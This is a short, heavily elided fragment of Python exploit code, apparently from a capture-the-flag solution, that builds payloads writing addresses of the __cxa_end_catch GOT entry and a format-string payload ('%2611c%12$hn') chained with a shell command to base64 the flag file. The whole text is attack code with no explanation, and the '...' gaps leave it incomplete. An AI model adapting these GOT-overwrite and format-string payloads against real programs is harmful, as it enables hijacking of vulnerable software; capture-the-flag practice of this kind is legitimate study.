...
payload2+=b'aa'
payload2+=p64(elf.got['__cxa_end_catch'])+p64(elf.got['__cxa_end_catch']+1)
...
payload3+=b'aa'
payload3+=p64(elf.got['__cxa_end_catch']+2)+p64(elf.got['__cxa_end_catch']+3)
...
payload4+=b'aa'
payload4+=p64(elf.got['__cxa_end_catch']+4)+p64(elf.got['__cxa_end_catch']+5)
quick(payload4)

payload5=b'base64<flag&&%2611c%12$hn%'
